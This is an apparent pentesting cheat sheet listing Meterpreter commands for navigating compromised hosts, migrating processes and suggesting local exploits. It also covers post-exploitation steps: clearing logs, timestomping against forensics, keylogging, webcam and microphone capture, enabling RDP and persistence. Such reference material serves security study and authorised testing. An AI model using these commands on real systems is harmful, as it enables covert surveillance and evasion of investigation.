# Common meterpreter commands - msfconsole

[Go back](../metasploit.md#meterpreter)

<div class="row row-cols-md-2"><div>

#### Linux-like commands

You can use many Linux-like commands such as:

```shell!
meterpreter> ls # list files
meterpreter> cd # move
meterpreter> pwd # path to current folder
meterpreter> cat file # print file
meterpreter> edit file # open file in vim
meterpreter> ps # see running processes
meterpreter> exit
```

#### Local commands

You can run commands on your machine in the meterpreter:

```shell!
meterpreter> lpwd # or getlwd, local path
meterpreter> lcd path # move to local path
meterpreter> lls path # list local files
meterpreter> lcat file # print local file
```
</div><div>

#### Common utilities

These are new convenient functions that were added:

```shell!
meterpreter> search -f pattern # search file by pattern
meterpreter> search -f pattern / # search inside /
meterpreter> download remote_path local_path # download
meterpreter> upload local_path remote_path # upload
```
</div></div>

<hr class="sep-both">

## Common commands for exploitation üí•

<div class="row row-cols-md-2"><div>

* ‚û°Ô∏è See if you are root and your privileges

```shell!
meterpreter> getuid
Windows: NT AUTHORITY\SYSTEM
```

* ‚û°Ô∏è Learn more about the system. Here with Windows, you could look for CVEs given the build version. The architecture can help too, as some scripts are less useful on some architectures.

```shell!
meterpreter> sysinfo
Computer        : XXX-PC
OS              : Windows X (... Build xxx...).
Architecture    : x64
```

* ‚û°Ô∏è Start a shell: `sh/bash` on Linux, `cmd` on Windows

```shell!
meterpreter> shell # start a shell
C:\WINDOWS\system32> # Windows cmd
```
</div><div>

* ‚û°Ô∏è Ask for suggested exploits

```shell!
meterpreter> run post/multi/recon/local_exploit_suggester
```

* ‚û°Ô∏è Load a local file `commands.txt` with meterpreter commands

```shell!
meterpreter> resource commands.txt
```

* ‚û°Ô∏è üìù Migrate to another process üìù. This is something as some services/stuff need us to be "in" a process that has the same architecture, and the same permissions, that our target. **Usually**, any process run by "NT AUTHORITY\SYSTEM"/root should be okay, although you may have to try a few times.

```shell!
meterpreter> ps # list process
meterpreter> migrate process_pid # move to another process
meterpreter> migrate -N process_name # same
meterpreter> # most used ones
meterpreter> migrate -N spoolsv.exe # can restart so good
meterpreter> migrate -N explorer.exe # screenshots...
```
</div></div>

<hr class="sep-both">

## Common commands for post-exploitation ‚úàÔ∏è

<div class="row row-cols-md-2 mt-4"><div>

* ‚û°Ô∏è | `root`. Clear logs

```shell!
meterpreter> clearev
```

* ‚û°Ô∏è  | `root`. Mess with timestamp to complicate forensics

```shell!
meterpreter> timestomp
```

* ‚û°Ô∏è Random commands

```shell!
meterpreter> idletime # time the host was idle
meterpreter> ipconfig # network information
meterpreter> localtime # time and date
meterpreter> getenv PATH # get PATH
meterpreter> checksum <file> # get file checksum
```
</div><div>

All the commands below require administrative/root privileges.

<details class="details-e">
<summary>Take control of the webcam</summary>

```shell!
meterpreter> webcam_list
meterpreter> webcam_snap
```
</details>

<details class="details-e">
<summary>Take a screenshot</summary>

```shell!
meterpreter> migrate -N explorer.exe
meterpreter> use espia
meterpreter> screengrab
```

You may also use `screenshot` üìå.
</details>

<details class="details-e">
<summary>Install a keylogger</summary>

```shell!
meterpreter> migrate -N explorer.exe
meterpreter> keyscan_start # start
meterpreter> keyscan_dump # dump keys
```
</details>

<details class="details-e">
<summary>Watch the screen in real time</summary>

Watch the remote user desktop in real time

```shell!
meterpreter> screenshare
meterpreter> record_mic # Record audio from the default microphone for X seconds
```
</details>

<details class="details-e">
<summary>Record microphone</summary>

Record audio from the default microphone for X seconds

```shell!
meterpreter> record_mic
```
</details>

<details class="details-e">
<summary>Enable Remote Desktop Protocol</summary>

```shell!
meterpreter> run post/windows/manage/enable_rdp
```
</details>

<details class="details-e">
<summary>Persistence</summary>

See [METERPRETER SERVICE](https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/).

```shell!
meterpreter> # Automatically start the agent when the system boots
meterpreter> run persistence -X
```
</details>
</div></div>